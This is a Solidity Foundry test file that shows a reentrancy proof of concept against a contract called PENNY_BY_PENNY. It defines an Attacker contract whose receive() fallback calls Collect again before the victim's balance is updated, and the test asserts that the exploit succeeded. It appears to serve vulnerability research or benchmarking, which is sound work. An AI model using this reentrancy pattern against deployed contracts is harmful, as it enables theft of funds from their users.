
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import {PENNY_BY_PENNY, LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public penny;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        penny = new PENNY_BY_PENNY();
        penny.SetMinSum(1);
        penny.SetLogFile(address(log));
        penny.Initialized();
        _attacker = new Attacker(address(penny));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 && attackVal <= type(uint128).max / 2);

        vm.deal(address(penny), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: 2 * attackVal}(attackVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 storedVal;
    bool reenteredWithOldState;

    constructor(address victimAddress) {
        victim = PENNY_BY_PENNY(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;
        victim.Collect(val);
        if (attackCallCount == 2 && reenteredWithOldState) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            if (victim.Acc(address(this)).balance == initialSnapshot) {
                reenteredWithOldState = true;
            }
            victim.Collect(storedVal);
        }
    }
}
